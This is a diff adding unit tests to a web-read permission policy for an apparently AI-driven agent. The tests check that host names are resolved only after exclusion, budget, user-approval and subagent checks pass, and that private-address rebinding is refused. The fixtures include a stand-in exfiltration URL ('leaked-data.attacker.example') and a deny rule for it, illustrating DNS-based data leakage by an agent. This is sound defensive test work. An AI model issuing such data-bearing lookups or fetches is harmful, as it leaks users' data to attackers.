@@ -338,3 +338,61 @@ describe('WebReadPolicy.searchesUnasked', () => {
     expect(ask.mock.calls[0][0]).toMatchObject({ scope: 'web_search:opencode', detail: 'Planner research wants to search the web with OpenCode\'s web search (Exa)' });
   });
 });
+
+// A lookup is itself a request: `<data>.attacker.tld` reaches the attacker's
+// name server whether or not the fetch that follows is refused. So a name is
+// resolved only once every other check has let the read through.
+describe('WebReadPolicy resolves a name last', () => {
+  function spied(given: Setup) {
+    const resolveHost = vi.fn(async (_host: string) => [PUBLIC_IP]);
+    return { ...setup({ ...given, policy: { resolveHost, ...given.policy } }), resolveHost };
+  }
+
+  it('never resolves an excluded host', async () => {
+    const { reads, resolveHost } = spied({ autonomous: true, allow: ['!https://*.attacker.example/*'] });
+
+    const decision = await reads.decide({ kind: 'fetch', url: 'https://leaked-data.attacker.example/' });
+
+    expect(decision.allowed === false && decision.reason).toMatch(/excluded/);
+    expect(resolveHost).not.toHaveBeenCalled();
+  });
+
+  it('never resolves a host once the budget is spent', async () => {
+    const { reads, resolveHost } = spied({ autonomous: true, policy: { budget: () => 0 } });
+
+    const decision = await reads.decide({ kind: 'fetch', url: 'https://leaked-data.attacker.example/' });
+
+    expect(decision.allowed === false && decision.reason).toMatch(/budget/);
+    expect(resolveHost).not.toHaveBeenCalled();
+  });
+
+  it('never resolves a host the user declined', async () => {
+    const { reads, ask, resolveHost } = spied({ answer: false });
+
+    const decision = await reads.decide({ kind: 'fetch', url: 'https://leaked-data.attacker.example/' });
+
+    expect(decision.allowed === false && decision.reason).toMatch(/not approved/);
+    expect(ask).toHaveBeenCalledTimes(1);
+    expect(resolveHost).not.toHaveBeenCalled();
+  });
+
+  it('never resolves a host a research subagent may not fetch', async () => {
+    const { reads, resolveHost } = spied({});
+
+    const decision = await reads.decide({ kind: 'fetch', url: 'https://leaked-data.attacker.example/' }, { prompting: false });
+
+    expect(decision.allowed === false && decision.reason).toMatch(/research agents/);
+    expect(resolveHost).not.toHaveBeenCalled();
+  });
+
+  it('resolves an allowed host, and gives the budget back when it resolves privately', async () => {
+    const resolveHost = vi.fn(async (host: string) => (host === 'rebind.example.com' ? ['10.0.0.7'] : [PUBLIC_IP]));
+    const { reads } = setup({ autonomous: true, policy: { resolveHost, budget: () => 1 } });
+
+    const refused = await reads.decide({ kind: 'fetch', url: 'https://rebind.example.com/' });
+    expect(refused.allowed === false && refused.reason).toMatch(/private address 10\.0\.0\.7/);
+
+    expect((await reads.decide({ kind: 'fetch', url: 'https://docs.example.com/' })).allowed).toBe(true);
+    expect(resolveHost.mock.calls.map(([host]) => host)).toEqual(['rebind.example.com', 'docs.example.com']);
+  });
+});
